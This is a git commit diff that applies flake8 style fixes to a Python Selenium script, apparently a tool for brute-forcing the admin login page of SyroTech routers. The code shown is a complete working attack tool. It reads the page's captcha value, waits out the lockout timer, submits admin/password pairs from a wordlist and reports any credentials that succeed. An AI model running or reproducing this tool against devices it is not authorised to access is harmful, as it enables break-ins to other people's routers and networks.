07f1429e4ce52cf38b04a33e938c4aba6b95e11a
alenpaul2001 <alenpaul2001@gmail.com>
2020-09-11 23:44:25 +0530

    enhanced by flake8

--- SyroTech BruteForce/__main__.py
+++ SyroTech BruteForce/__main__.py
@@ -2,38 +2,43 @@
 # -*- coding: utf-8 -*-
 from selenium import webdriver
 import argparse
-import time, os
+import time
+import os
 
 
 class BruteForce(object):
+
     start = time.time()
+
     def __init__(self, bin, V):
         if not bin:
             options = webdriver.ChromeOptions()
-            if not V:options.add_argument('headless')
+            if not V:
+                options.add_argument('headless')
             self.browser = webdriver.Chrome(options=options)
             print("> Lauching Chrome [✔]")
         else:
             options = webdriver.FirefoxOptions()
-            if not V:options.add_argument('headless')
+            if not V:
+                options.add_argument('headless')
             self.browser = webdriver.Firefox(options=options)
             print("> Lauching Firefox [✔]")
-
 
     def get(self, page):
         self.browser.get(page)
 
-
     def solve_cap(self):
-        try:return self.browser.find_element_by_id("check_code").get_attribute("value")
-        except:
+        try:
+            return self.browser.find_element_by_id("check_code").get_attribute("value")
+        except Exception:
             try:
                 t = self.browser.find_element_by_id("timer").text
                 print(f"Encountered 404 Sleeping for {t}s [!]")
                 time.sleep(int(t)+5)
                 return self.browser.find_element_by_id("check_code").get_attribute("value")
-            except:print("Either the site is not responding or does not exist");exit()
-
+            except Exception:
+                print("Either the site is not responding or does not exist")
+                exit()
 
     def fill_forms(self, admin, password, cap):
         self.browser.find_element_by_id("username1").send_keys(admin)
@@ -41,15 +46,15 @@ class BruteForce(object):
         self.browser.find_element_by_id("verification_code").send_keys(cap)
         self.browser.find_element_by_xpath("//input[@value=' Login']").click()
 
-
     def is_error(self):
         try:
             h4 = self.browser.find_element_by_tag_name("h4")
             if "wrong password" in h4.text or "3 consecutive times" in h4.text:
                 return True
-            else:return False
-        except:return False
-
+            else:
+                return False
+        except Exception:
+            return False
 
     @staticmethod
     def wordlist_parser(wordlist):
@@ -60,25 +65,32 @@ class BruteForce(object):
 
 
 def main():
-    parser = argparse.ArgumentParser(description='BruteForce SyroTech admin page', epilog='By AlenPaulVarghese', prog="SyroTech-AdminPage-BruteForcer")
+    parser = argparse.ArgumentParser(
+        description='BruteForce SyroTech admin page', epilog='By AlenPaulVarghese', prog="SyroTech-AdminPage-BruteForcer")
     parser.add_argument('list', help="passwordlist where each line is in admin/password format", type=str)
     parser.add_argument('-l', '--link', help="ip addr of the site defaul value https://192.168.1.1", default='http://192.168.1.1', metavar="")
     parser.add_argument('-V', '--verbose', action="store_true", help="run selenium without headless")
     parser.add_argument('-F', '--firefox', action="store_true", help="pass -F to use firefox geckodriver")
     options = parser.parse_args()
     if not os.path.isfile(options.list):
-        print(f"File not found --> {options.list}");return
+        print(f"File not found --> {options.list}")
+        return
     print("> Wordlist Found [✔]")
     brute = BruteForce(options.firefox, options.verbose)
-    for x,y in BruteForce.wordlist_parser(options.list):
+    for x, y in BruteForce.wordlist_parser(options.list):
         brute.get(options.link+"/admin/login.asp")
-        cap = brute.solve_cap();print(f"Trying {x}/{y} [?]", end=" - ")
+        cap = brute.solve_cap()
+        print(f"Trying {x}/{y} [?]", end=" - ")
         brute.fill_forms(x, y, cap)
-        if brute.is_error():print("X")
-        else:print(f"Found Credentials : {x}/{y} [✔]");break
+        if brute.is_error():
+            print("X")
+        else:
+            print(f"Found Credentials : {x}/{y} [✔]")
+            break
 
 
 if __name__ == "__main__":
-    try:main()
+    try:
+        main()
     except KeyboardInterrupt:
         pass
